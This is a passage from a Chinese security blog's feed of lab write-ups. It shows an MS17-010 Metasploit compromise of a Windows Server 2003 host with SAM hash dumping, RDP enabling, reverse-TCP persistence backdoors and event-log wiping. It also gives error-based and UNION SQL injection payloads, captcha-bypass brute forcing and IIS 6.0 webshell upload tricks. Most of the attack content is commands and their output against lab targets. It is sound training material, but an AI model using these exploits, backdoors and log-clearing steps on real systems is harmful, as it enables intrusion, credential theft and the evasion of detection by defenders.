我们使用auxiliary辅助模块中的ms17_010_command载荷去扫描确认目标系统是否真的有SMB服务的远程代码执行的漏洞 1234567891011121314151617181920212223242526272829303132msf &gt; use auxiliary/admin/smb/ms17_010_command //使用该载荷msf auxiliary(admin/smb/ms17_010_command) &gt; set rhosts 192.168.135.136 //设置目标rhosts =&gt; 192.168.135.136msf auxiliary(admin/smb/ms17_010_command) &gt; exploit //进行攻击[*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 192.168.135.136:445 - Filling barrel with fish... done[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - [*] Preparing dynamite...[*] 192.168.135.136:445 - Trying stick 1 (x64)...Miss[*] 192.168.135.136:445 - [*] Trying stick 2 (x86)...Boom![*] 192.168.135.136:445 - [+] Successfully Leaked Transaction![*] 192.168.135.136:445 - [+] Successfully caught Fish-in-a-barrel[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8fdf1cb0[*] 192.168.135.136:445 - Built a write-what-where primitive...[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.135.136:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.135.136:445 - Output for &quot;net group &quot;Domain Admins&quot; /domain&quot;:ةĻ Domain Adminsעˍ ָ¶¨µœꝀ³ʔ±-------------------------------------------------------------------------------Administrator ļ®³ɹ¦Ϊ³ɡ£[+] 192.168.135.136:445 - Cleanup was successful[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Successful 而且目标为Administrator 权限 攻击目标123msf auxiliary(admin/smb/ms17_010_command) &gt; use exploit/windows/smb/ms17_010_psexec //使用攻击模块msf exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.135.136 //设置目标rhost =&gt; 192.168.135.136 对于ms17_010_psexec攻击脚本,不需要设置payload,我原先设置windows/x64/meterpreter/reverse_tcp 载荷一直不出来结果,后来才得知这个攻击脚本里面有meterpreter的载荷,无需设置即可 1234567891011121314151617181920212223242526msf exploit(windows/smb/ms17_010_psexec) &gt; exploit //开始攻击[*] Started reverse TCP handler on 192.168.135.134:4444 [*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 192.168.135.136:445 - Filling barrel with fish... done[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - [*] Preparing dynamite...[*] 192.168.135.136:445 - Trying stick 1 (x64)...Miss[*] 192.168.135.136:445 - [*] Trying stick 2 (x86)...Boom![*] 192.168.135.136:445 - [+] Successfully Leaked Transaction![*] 192.168.135.136:445 - [+] Successfully caught Fish-in-a-barrel[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8f3e37c0[*] 192.168.135.136:445 - Built a write-what-where primitive...[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained![*] 192.168.135.136:445 - Selecting native target[*] 192.168.135.136:445 - Uploading payload...[*] 192.168.135.136:445 - Created \ZKbfdlYf.exe...[+] 192.168.135.136:445 - Service started successfully...[*] 192.168.135.136:445 - Deleting \ZKbfdlYf.exe...[-] 192.168.135.136:445 - Delete of \ZKbfdlYf.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)[*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 1 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2240) at 2019-02-19 19:13:26 +0800meterpreter &gt; //攻击成功,拿到目标的会话 后渗透阶段先介绍一下Meterpreter: Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。 在后渗透阶段我们将使用Meterpreter进行攻击 1234567891011121314151617181920meterpreter &gt; help //输入help命令可以查看在meterpreter模块下执行的命令meterpreter &gt; sysinfo //查看系统信息Computer : MYCOMPUTEROS : Windows .NET Server (Build 3790, Service Pack 2).Architecture : x86System Language : zh_CNDomain : LOUISNIELogged On Users : 3Meterpreter : x86/windowsmeterpreter &gt; getsystem //提升到system权限...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; hashdump //导出SAM数据库的内容Administrator:500:570ce399da1412abaad3b435b51404ee:b9d2d4955b330b503cc792eb6a55bb1f:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98e07fb45acadfe5febbf70690d16ae0:::SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:18861c2baa27b5a9100c04acbbfa47d9:::IUSR_MYCOMPUTER:1108:e2e508b31b1336d2c996f97338db8790:03320631cb387004f82daec52f03935f:::IWAM_MYCOMPUTER:1109:fc512ee6de7b912f77747be12787d540:0f8f47aec1c4bc8897a81bce48cc20da:::MYCOMPUTER$:1005:aad3b435b51404eeaad3b435b51404ee:979f58fb772361956a63f2bc34036a09::: SAM简介: SAM是windows系统的一个系统用户账号管理文件。其全称为security account manager。Windows中对用户账户的安全管理使用了安全账号管理器SAM(security account manager)的机制,安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识都时完全不同的。因此，一旦某个账号被删除，它的安全标识就不再存在了，即使用相同的用户名重建账号，也会被赋予不同的安全标识，不会保留原来的权限。 其文件位置：C:\windows\system32\config\SAM 其格式是 用户名称:RID:LM-HASH值:NT-HASH::: 在Windows系统下,有两大hash,分别是LM HASH&amp;NT HASH 对于NT HASH,我们直接可以在cmd5网站进行解密,解密Administrator用户密码为redhat 1234567891011121314151617181920212223242526272829303132333435363738394041424344msf exploit(windows/smb/ms17_010_psexec) &gt;run post/windows/manage/enable_rdp //打开目标服务器的远程连接msf exploit(windows/smb/ms17_010_psexec) &gt;exploitmeterpreter &gt; portfwd add -l 2222 -r 192.168.135.136 -p 3389 //反弹目标的3389端口到本地的2222端口并监听该端口[*] Local TCP relay created: :2222 &lt;-&gt; 192.168.135.136:3389meterpreter &gt; portfwd //查看是否反弹成功Active Port Forwards==================== Index Local Remote Direction ----- ----- ------ --------- 1 0.0.0.0:2222 192.168.135.136:3389 Forward1 total active port forwards.root@kali:~# netstat -an | grep &quot;2222&quot; //我们在kali查看2222端口是在监听状态tcp 0 0 0.0.0.0:2222 0.0.0.0:* LISTEN root@kali:~# rdesktop 127.0.0.1:2222 //连接本地的2222端口反弹到目标的3389端口,即打开目标的桌面meterpreter &gt; ps //查看系统进程Process List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 NT AUTHORITY\SYSTEM 240 2792 mstsc.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\mstsc.exe 264 4 smss.exe x86 0 NT AUTHORITY\SYSTEM \SystemRoot\System32\smss.exe 292 808 explorer.exe x86 0 LOUISNIE\Administrator C:\WINDOWS\Explorer.EXE 312 264 csrss.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\csrss.exe 336 264 winlogon.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\winlogon.exe 384 336 services.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\services.exe 396 336 lsass.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\lsass.exe 452 1744 wuauclt.exe x86 2 LOUISNIE\Administrator C:\WINDOWS\system32\wuauclt.exe 588 384 vmacthlp.exe x86 0 NT AUTHORITY\SYSTEM meterpreter &gt; migrate 292 //将该会话和系统进程绑定,免杀.格式是:migrate PID meterpreter &gt; execute -H -i -f cmd.exe //创建新进程cmd.exe，-H不可见，-i交互 -f用系统命令去执行meterpreter &gt; kali 1569 //杀死进程,格式是:kali PID 植入后门,维持控制 1234567891011121314151617181920212223242526272829msf exploit(windows/smb/ms17_010_psexec) &gt; sessions -i 2 //开启第二个会话[*] Starting interaction with 2...meterpreter &gt; run persistence - X -i 5 -p 4445 -r 192.168.135.136 //运行后门程序，-X指定启动的方式为开机自启动，-i反向连接的时间间隔[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /root/.msf4/logs/persistence/MYCOMPUTER_20190219.3953/MYCOMPUTER_20190219.3953.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.135.136 LPORT=4445[*] Persistent agent script is 99670 bytes longmeterpreter &gt; background [*] Backgrounding session 2...msf exploit(windows/smb/ms17_010_psexec) &gt; back msf &gt; use exploit/multi/handler //使用exploit/multi/handler监听连入的backdoormsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp //设置载荷payload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.135.134 //设置将反弹到本地来lhost =&gt; 192.168.135.134msf exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 192.168.135.134:4444 [*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 3 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2364) at 2019-02-19 21:42:12 +0800[*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 4 opened (192.168.135.1 或者我们可以使用metsvc模块来留下后门 metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件： metsvc.dll metsvc-service.exe metsvc.exe 12msf exploit(multi/handler) &gt; sessions -i 2 //选择一个会话meterpreter &gt; run metsvc //运行metsvc 清除日志: 1234meterpreter &gt; clearev [*] Wiping 1 records from Application...[*] Wiping 26 records from System...[*] Wiping 2281 records from Security...]]></content>
      <categories>
        <category>主机渗透</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入之基于函数报错的信息获取]]></title>
    <url>%2F2019%2F01%2F07%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%2F</url>
    <content type="text"><![CDATA[人生舞台的大幕随时都可能拉开，关键是你愿意表演，还是选择躲避。 实验环境:pikachu靶机 基于函数报错的信息获取1.常用的报错函数updatexml(),extractvalue(),floor()2.基于函数报错的信息获取(select,insert,update,delete) 技巧思路:在MySQL中使用一些指定的函数来制造报错,从而从报错信息中获取设定的信息select/insert/update/delete都可以使用报错来获取信息 背景条件:后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端 updatexml函数使用方法updatexml():函数是MySQL对XML文档数据进行查询和修改的XPATH函数updatexml()函数作用:改变(查找并替换)XML文档中符合条件的节点的值语法:updatexml(xml_document,xpathstring,new_value)第一个参数:XML文档的名称第二个参数:XML文档的位置(路径),通过xpath定位 ,也可以是表达式,那么数据库便会将这个表达式去执行第三个参数:new_value,string格式,替换查找到的符合条件的注:xpath定位必须是有效的,否则会发生错误 基于updatexml()报错进行信息获取基于报错信息获取数据,必须要有报错信息的返回 我们使用updatexml()函数构造报错,获取数据库信息使用concat函数将两个字符串一起打印出来,concat中也可以执行表达式(函数)0x7e:为~的16进制,其目的为避免信息不被系统去掉,将结果构造出完整的字符串查看其数据库版本信息:1123&apos; and updatexml(1,concat(0x7e,version()),0)# 查看当前数据库信息: 1123&apos; and updatexml(1,concat(0x7e,database()),0)# 查看当前数据库第一张表:1123&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&quot;pikachu&quot; limit 0,1)),0)# 查出第一个表为httpinfo 依次查询得到的表为httpinfo,membr,message,users,xssblind 查看users表的字段:1123&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1)),0)# 得到users表第一个字段为id,第二个字段为username,第三个字段为password,第四个为level 查看用户名1123&apos; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)# 得到users表的用户名分别为:admin,pikachu,test 查看其对应的密码1123&apos; and updatexml(1,concat(0x7e,(select password from users where username=&apos;admin&apos; limit 0,1)),0)# 得到admin用户的经过MD5加密的值,解密为123456 extractvalue()函数使用方法extractvalue()函数:从目标XML中返回包含所查询值的字符串语法:ExtractValue(xml_document,xpath_string)第一个参数:XML_document是string格式,为XML文档对象的名称,文中为Doc第二个参数:XPath_string(Xpath格式的字符串)XPath定位必须是有效的,否则会发生错误 基于updatexml()报错进行信息获取获取数据库信息:11&apos; and extractvalue (0,concat(0x7e,database()))# 其后续操作与updatexml函数操作一致,我就不继续写下去啦 floor()函数使用方法floor():MySQL中用来取整的函数.使用floor函数必须要满足三个条件:其SQL语句中存在count函数,rand函数,group by 这三个值才可以使用其payload为:1xxx&apos; and (select 2 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a )# 关于floor报错原理分析请参考此篇文章:http://blog.51cto.com/chichu/2051375]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pikachu靶机实战之暴力破解]]></title>
    <url>%2F2019%2F01%2F02%2Fpikachu%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[态度决定高度! 靶机简介Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 是个适合新手练习的靶场Pikachu上的漏洞类型列表如下：Burt Force(暴力破解漏洞)XSS(跨站脚本漏洞)CSRF(跨站请求伪造)SQL-Inject(SQL注入漏洞)RCE(远程命令/代码执行)Files Inclusion(文件包含漏洞)Unsafe file downloads(不安全的文件下载)Unsafe file uploads(不安全的文件上传)Over Permisson(越权漏洞)../../../(目录遍历)I can see your ABC(敏感信息泄露)PHP反序列化漏洞XXE(XML External Entity attack)不安全的URL重定向SSRF(Server-Side Request Forgery)More…(找找看?..有彩蛋!)管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~ 安装和使用Pikachu使用世界上最好的语言PHP进行开发-_-，数据库使用的是mysql，因此运行Pikachu你需要提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境，建议在你的测试环境直接使用 一些集成软件来搭建这些基础环境,比如XAMPP,WAMP等,作为一个搞安全的人,这些东西对你来说应该不是什么难事。接下来:–&gt;把下载下来的pikachu文件夹放到web服务器根目录下;–&gt;根据实际情况修改inc/config.inc.php里面的数据库连接配置;–&gt;访问 http://x.x.x.x/pikachu ,会有一个红色的热情提示”欢迎使用,pikachu还没有初始化，点击进行初始化安装!”,点击即可完成安装。 暴力破解实验Burte Force（暴力破解）概述 暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：1.是否要求用户设置复杂的密码；2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；4.是否采用了双因素认证；…等等。 基于表单的暴力破解我们使用burpsuite进行暴力破解,由于前端没有验证码等防范暴力破解的措施,我们直接输入用户名密码,发送到burpsuite的intruder模块,一般用户名为admin,administrator(Windows环境)或者root(Linux环境),我设置admin为用户名,对其密码进行爆破 不安全的验证码-on client常见问题验证码作用:1,防止暴力破解2,防止机器恶意注册 验证码的认证流程:客户端request登录页面,后台生成验证码1,后台使用算法生成图片,并将图片response给客户端2,同时将算法生成的值全局赋值存到session中. 校验验证码:1,客户端将认证信息和验证码一同提交2,后台对提交的验证码和session里面的进行比较 客户端重新刷新页面,再次生出新的验证码验证码算法中一般包含随机函数,所以每次刷新都会改变 不安全的客户端验证码常见问题:1,使用前端js实现验证码(纸老虎)2,将验证码在cookie中泄露,容易被获取3,将验证码在前端源代码中泄露,容易被获取 开始试验:首先尝试输入错误的用户名,密码+错误的验证码,点击登录页面返回验证码不正确然后输入错误的用户名,密码+正确的验证码,点击登录页面返回用户名或者密码不正确当输入错误的用户名,密码+空验证码,点击登录页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常当查看源代码的时候发现是前台生出的验证码如果后台不对前台输入的验证码进行校验的话,那么通过burp代理(客户端和服务端中间人)即可绕过验证码我们使用burp抓包看看是否对输入的验证码进行校验,结果是用户名或者密码不存在然后换个账号密码继续发包,判断服务器端是否对用户前端输入的验证码进行校验还是用户名密码不正确,但并未返回验证码不正确 我们都知道当用户输入账号密码和验证码之后,服务器端首先验证验证码是否正确,如果不正确直接返回验证码不正确,如果验证码正确,那么服务器端会接着验证用户名密码是否正确.我们刚刚的结果是用户名或者密码不存在,表示验证码验证那一关我们是完美的避过了,然后再爆破用户名密码即可爆破出用户名为:admin/123456pikachu/000000test/abc123 不安全的验证码-on server常见问题不安全的验证码-on server常见问题1,验证码在后台不过期,导致可以长期被使用2,验证码校验不严格,逻辑出现问题3,验证码设计的太过简单和有规律,容易被猜解 针对于第一个验证码在后台不过期的漏洞,开始实验首先尝试输入错误的用户名,密码+错误的验证码,点击登录burp抓返回包页面返回验证码不正确然后输入错误的用户名,密码+正确的验证码,点击登录burp抓返回包页面返回用户名或者密码不正确当输入错误的用户名,密码+空验证码,点击登录burp抓返回包页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常 当刷新页面,客户端向服务器发出请求,生出新的验证码,同时后台会在session中将这个验证码存下来(存下来的目的是为了对用户输入的验证码进行验证),所以当输入错误的验证码或者空的验证码的时候都会提示验证码错误,只有正确的验证码才可以被服务器接受 但是如果这个验证码在后台不过期或者过期时间较长,足够我们去爆破用户名密码,那么漏洞就产生了.1,首先先正常提交用户名密码验证码,然后发送到repeater模块中2,关闭burp代理功能,刷新页面,会生出新的验证码,记住新的验证码3,在repeater模块中将新的验证码写入,重放发现其提示是用户名密码错误4,将账户名密码替换,试试验证码还有没有效5,因为无论怎么替换用户名和密码,验证码都正确,所以那么这一关我们是完美的避过了,然后再爆破用户名密码即可 漏洞分析:其漏洞根本在于服务器端未设定生出验证码的session的过期时间,那么按照PHP语言默认session的过期时间为24分钟,这个验证码24分钟内都是有效的,那么也足够黑客进行暴力破解啦 修复方法:法一,在php.ini配置文件中设置过期时间法二,在代码中设定该验证码验证过一次之后,就将其session进行销毁(更有效) token防止暴力破解?曾经网上有人说可以使用token防止暴力破解,其原理就是当用户打开页面时,后端生出一个token值,token会被存放到session中去,同时服务端会将token发送到前端的表单中,当用户输入账号密码点击确认的时候,客户端会将账号密码+token一起发送到服务器端,当刷新页面之后,token即就会变化 但是token会被显示在前端的表单中,黑客完全可以通过代码获取表单的token,然后配合暴力破解即可]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[凌云志]]></title>
    <url>%2F2018%2F11%2F07%2F%E5%87%8C%E4%BA%91%E5%BF%97%2F</url>
    <content type="text"><![CDATA[雨落惊得杨柳斜，少年蹒跚几经劫。过荆棘如履平地，流血依旧笑欢颜。千难万阻志不灭，惧他风雪万里渊？他日我得凌云志，日晖逊色半边天！]]></content>
      <categories>
        <category>励志</category>
      </categories>
      <tags>
        <tag>励志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS6.0容器之解析漏洞复现]]></title>
    <url>%2F2018%2F10%2F30%2FIIS6.0%E5%AE%B9%E5%99%A8%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[态度决定高度! 漏洞简介解析漏洞是指web服务器因对HTTP请求处理不当导致将非可执行的脚本,文件等当作可执行的脚本去执行.该漏洞一般配合web容器(iis,nginx,apache,tomcat等)的文件上传功能去使用,以获取服务器的权限. IIS5.X/6.X解析漏洞对于IIS服务器5版本和6版本存在两个解析漏洞,分别为目录解析和文件解析 目录解析简介:在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.举个栗子:/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关. 实验:我们这里使用墨者学院提供的实验环境去复现该漏洞执行过程.(墨者学院解析漏洞链接) 我们在界面先上传一个普通文件,通过F12控制台查看消息头,得知目标服务器为Microsoft-IIS/6.0,也有需要上传的地方,我们可以试试目录解析漏洞.我们先随意上传一个文件,观其url发现是asp脚本构造的页面,然后在本地制作一个asp的一句话木马保存到一个文件中,然后打开burpsuite的代理功能去进行抓包修改我们在发送的POST请求中发现刚刚发送的asp.txt被保存的第二个upload文件下,为了让其执行,所以我们在第二个upload后面加入/webshell.asp文件,这样就能将asp.txt这个一句话木马放入webshell.asp中,便可以利用解析漏洞直接将asp.txt当作asp脚本去执行在burp中转发浏览器显示成功上传,并列出上传的地址成功的将asp一句话木马上传到目标服务器中,这样我们可以使用中国菜刀去远程连接 文件解析/后缀解析简介:在IIS6.0下,分号后面的内容不被解析,举个栗子,xx.asp;.jpg将会当作xx.asp去解析执行.IIS6.0 默认的可执行文件除了.asp，还包含这三种：.asa .cdx .cer. 例如：test.asa 、 test.cdx 、 test.cer 实验:继续使用刚刚的环境,我们将刚刚的asp木马文件名修改为webshell.asp;.txt,因为该网站不允许上传以asp作为后缀的文件名,所以我们使用.txt后缀,但分号后面的内容将会被IIS过滤不去解析,所以这就是个asp脚本.我们将文件直接上传到upload目录下,然后使用菜刀连接,也是可以连接上的.https://i.loli.net/2018/10/30/5bd7346bd84d0.png当然顺便也能找到所需要的key值]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者学院--手工注入mysql数据库实例]]></title>
    <url>%2F2018%2F10%2F23%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[发现漏洞 开启墨者靶场环境,发现此界面,在点击登陆下方的通知之后惊奇的看到存在参数id,可以试试通过传递SQL语句获取数据库信息. 注入测试我们可以试试1=1和1=2大法,输入在参数id=1后面加入1=1进行逻辑判断显示正常,然后换1=2,因为1=2为一个假命题,如果能插入到数据库进行逻辑判断,那么由于该语句错误,数据库查询不到任何信息,界面就不会显示任何信息根据这种情况可以大概的判断出该网站很大可能存在SQL注入漏洞.我们可以大概的猜测出该web页面中背后的SQL语句为 1select column1,column2..... from table where id=$_GET[&quot;id&quot;] 然后通过order by判断出该SQL语句查询有多少列(或者说查询多少个字段),order by用于对筛选出来的结果按照列(关键字)进行排序,对于多列的时候，先按照第一个column name排序，如果第一个column name相同,则按照第二个column name排序,我们输入: 12http://219.153.49.228:42182/new_list.php?id=1 order by 1,2,3,4,5#假设该SQL语句中查询了5个关键字,如果没报错,那么表示所查询的关键字大于或者等于5,如果报错表示查询的小于5 出现报错,表示所选择的关键字小于5,我们换成3,可以正确显示其界面,换成4也可以正常显示,所以可以得出所选择的关键字个数为4.那么其SQL语句为: 1select column1,column2,column3,column4 from table where id=$_GET(&quot;id&quot;) 接下来判断在页面中可以显示的关键字其SQL语句为: 1select column1,column2,column3,column4 from table where id=5 union select 1,2,3,4 注:由上面的操作得出该SQL语句查询4个关键字,我们将id=5,则对于第一个SQL语句由于不满足where条件而不显示其内容,所以执行第二条语句,select 1,2,3,4就是判断在页面中显示的是哪些关键字.)由这个信息可以得出显示的是第二个和第三个字段的内容 获取数据库信息我们将第二个和第三个字段换成MySQL数据库中的函数,即可获取其数据库的信息使用user()函数可以得知当前数据库的使用者使用database()函数可以得知当时数据库的名称)该MYSQL数据库名叫mozhe_Discuz_StormGroup,当前使用者为root在MYSQL数据库中有一个数据库叫information_schema数据库,它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。可以简单的理解为数据词典或者系统目录. )其命令为: 12http://219.153.49.228:42182/new_list.php?id= 5 union select 1, schema_name ,3,4 from information_schema.schemata limit 0,1 注:limit 0,1表示从第0行起,取第一行数据,第一行为information_schema,举个例子:)limit 0,1即就是指dvwa数据库limit1,1即就是information_schema数据库回到原来的注入问题,我们将limit 0,1换成limit 1,1 limit 2,2 limit 3,3 limit 4,4 information_schema,mozhe_Discuz_StormGroup,mysql,performance_schema,sys这五个数据库,当输入limit5,5页面没有内容表示目前拥有五个数据库.然后枚举数据库中的数据表注入的URL为: 1http://219.153.49.228:43635/new_list.php?id=5 union select 1,table_name,3,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1 获得mozhe_Discuz_StormGroup数据库的第一张表为StormGroup_member)将0,1替换为1,1所得到的数据表为notice,替换成2,2则没有显示任何数据表示该数据库只有两张表.所以得到数据库mozhe_Discuz_StormGroup中有两张表为StormGroup_member和notice表,那么我们查其列.1http://219.153.49.228:43635/new_list.php?id=5 union select 1,column_name,3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos; limit 0,1 得到在其StormGroup_member表下有个列为id,我们将0,1替换成1,1 2,2 3,3 得到的列分别是name,password,status那么可以得知在mozhe_Discuz_StormGroup数据库的StormGroup_member表下有四列分别是id,name,password,status 12http://219.153.49.228:43635/new_list.php?id=5 union select 1,name,3,4 from StormGroup_member limit 0,1 )查找其密码列 1http://219.153.49.228:43635/new_list.php?id=5 union select 1,password,3,4 from StormGroup_member limit 0,1 )将此密码进行MD5解密可得明文密码)然后我们就可以进入后台管理系统啦]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w3af--命令行模式实验简述]]></title>
    <url>%2F2018%2F10%2F23%2Fw3af-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%AE%9E%E9%AA%8C%E7%AE%80%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[实验环境:Kali:192.168.128.128Metasploitable:192.168.128.129 安装W3af:简介及安装w3af文档w3af用户接口: ​ console命令行接口 ​ Gui图形界面化接口 ​ API接口 开始操作123456789101112131415161718192021222324root@kali:~/w3af-master# ./w3af_console w3af&gt;&gt;&gt; w3af&gt;&gt;&gt; help #help命令列出当前命令提示符下的可用指令|-----------------------------------------------------------------------------------|| start | Start the scan. 开始扫描 || plugins | Enable and configure plugins. 选择和配置插件 || exploit | Exploit the vulnerability. 使用该模块进行攻击漏洞 || profiles | List and use scan profiles. 列出可以用来扫描的文件 || cleanup | Cleanup before starting a new scan. 在开始新扫描之前进行清理 ||-----------------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more specific help || | about &quot;command&quot; || version | Show w3af version information. 显示w3af版本信息 || keys | Display key shortcuts. 显示关键快捷方式。 ||-----------------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. 配置框架的HTTP设置。 || misc-settings | Configure w3af misc settings. 配置w3af misc设置 || target | Configure the target URL. 配置目标URL ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. 返回前一目录 || exit | Exit w3af. 退出 ||-----------------------------------------------------------------------------------|| kb | Browse the vulnerabilities stored in the Knowledge Base 浏览存储在知识库中的漏洞 ||----------------------------------------------------------------------------------- 12345678910111213141516171819w3af&gt;&gt;&gt; plugins #输入plugins,进入插件目录的内,w3af/plugins&gt;&gt;&gt; help #输入help显示当前可使用的命令|-----------------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------|| output | View, configure and enable output plugins || grep | View, configure and enable grep plugins || evasion | View, configure and enable evasion plugins || audit | View, configure and enable audit plugins || infrastructure | View, configure and enable infrastructure plugins || crawl | View, configure and enable crawl plugins || auth | View, configure and enable auth plugins || mangle | View, configure and enable mangle plugins || bruteforce | View, configure and enable bruteforce plugins ||-----------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; list audit 或者audit 